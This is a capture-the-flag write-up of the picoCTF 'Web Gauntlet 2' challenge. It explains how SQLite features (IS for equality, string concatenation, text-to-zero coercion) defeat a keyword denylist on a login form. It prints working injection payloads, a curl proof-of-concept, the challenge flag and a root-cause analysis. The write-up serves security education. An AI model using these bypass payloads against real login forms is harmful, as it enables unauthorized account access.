# Web Gauntlet 2

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{0n3_m0r3_t1m3_85a265ac}`

## Summary

A login form builds a SQLite query by directly interpolating the submitted username and
password into a `WHERE username='...' AND password='...'` clause. A keyword blocklist rejects
`or`, `and`, `true`, `false`, `union`, `like`, `=`, `>`, `<`, `;`, `--`, `/* */`, and `admin`
(plus, undocumented, `password`) from either field, and a separate check caps the combined
length of both fields at 35 characters. Every blocked keyword has a short SQLite-native
workaround: `IS` replaces `=`, string concatenation (`'adm'||'in'`) reconstructs the word
`admin` without ever containing it as a contiguous substring, and a self-neutralizing arithmetic
expression (`0+'x'`) forges an always-true password check without referencing the `password`
column by name.

## Discovery

The homepage is a login form; `filter.php` discloses the (partial) blocklist:

```
Filters: or and true false union like = > < ; -- /* */ admin
```

Submitting `user=test&pass=test` echoes the literal SQL back in the response (a debug leftover),
confirming direct string interpolation with no escaping:

```
SELECT username, password FROM users WHERE username='test' AND password='test'
```

Submitting an unbalanced quote produces a raw PHP/SQLite3 warning showing the exact parse error
and position, which turned this into a fully interactive SQL oracle: I could see both the
assembled query text and whether it parsed.

Any request containing a blocked word (case-insensitively, anywhere in either field) returns
`Filtered!` instead of running the query. A payload that's syntactically broken but not
filtered shows a `Warning: SQLite3::query(): Unable to prepare statement...syntax error` message
with the exact failure point. A long combined payload (username length + password length > 35)
returns `Combined input lengths too long! (> 35)` before the query even runs.

## Building the bypass

**Replacing `=` with `IS`:** SQLite's `IS` operator performs an equality-style comparison and
isn't in the blocklist. `(username='') IS 0` is `TRUE` for any real row (`username=''` is always
`0`/false, and `0 IS 0` is true), a compact universal-match primitive verified first against a
local SQLite copy of the schema:

```
$ sqlite3 test.db "SELECT 'test1', username, password FROM users WHERE username='' IS 0"
test1|admin|supersecretpw123
test1|guest|guestpass
```

**Spelling "admin" without the substring "admin":** the filter does a plain substring search on
the raw submitted text, so splitting the word across a concatenation operator defeats it while
SQLite still reconstructs the full string at evaluation time:

```
adm'||'in
```

As the username field, this closes the app's opening quote after `adm`, concatenates in raw SQL
(`||`), and the app's own quote closes the second half (`in`) — producing
`username='adm'||'in'`, i.e. `username='admin'`, with the literal substring `admin` never
appearing in the request.

**Referencing the password column without the word "password":** testing showed the literal word
`password` is *also* silently filtered (not listed on `filter.php`), which blocks the obvious
`password=password` self-comparison. Since a numeric value added to non-numeric text coerces to
`0` in SQLite arithmetic, closing the password field's string early and adding an arbitrary
throwaway string neutralizes the whole comparison to a guaranteed match, with no column
reference at all:

```
' IS 0+'x
```

`password='' IS 0+'x'` → `(password='')` is `0` (false, deterministic) → `0+'x'` is `0`
(non-numeric text coerces to `0` in arithmetic) → `0 IS 0` → `TRUE`, for every row.

## Proof of Concept

```
curl -s -c cookies.txt -X POST "http://TARGET/index.php" \
  --data-urlencode "user=adm'||'in" \
  --data-urlencode "pass=' IS 0+'x"
```

Resulting query (echoed by the app):

```sql
SELECT username, password FROM users WHERE username='adm'||'in' AND password='' IS 0+'x'
```

Combined payload length: 18 characters (well under the 35-character cap). Response:

```
Congrats! You won! Check out filter.php
```

The win is tracked server-side in `$_SESSION["winner2"]`, so the flag is retrieved by revisiting
`filter.php` with the same session cookie, which now dumps its own source via `highlight_file()`:

```
curl -s -b cookies.txt "http://TARGET/filter.php"
```

```php
// picoCTF{0n3_m0r3_t1m3_85a265ac}
```

(The source also confirms `winner2` is reset to `0` immediately after this one view — "Don't
refresh!" — so the flag-bearing view is single-use per login.)

## Root Cause

User input is concatenated directly into a SQL string with no parameterization, and the only
defense is a keyword denylist applied to the raw request text. Denylists over a tokenized
language like SQL are fundamentally incomplete: every blocked keyword had a semantically
equivalent SQLite construct that wasn't blocked (`IS` for `=`), every blocked literal string
could be reassembled from disjoint substrings via string concatenation, and arithmetic type
coercion (text-to-zero) provided a way to build an always-true condition without referencing the
sensitive column name at all.

## CWE / OWASP

- **CWE-89**: SQL Injection
- **CWE-184**: Incomplete List of Disallowed Inputs (denylist/blocklist filtering instead of
  parameterized queries)
- **OWASP A03:2021**: Injection
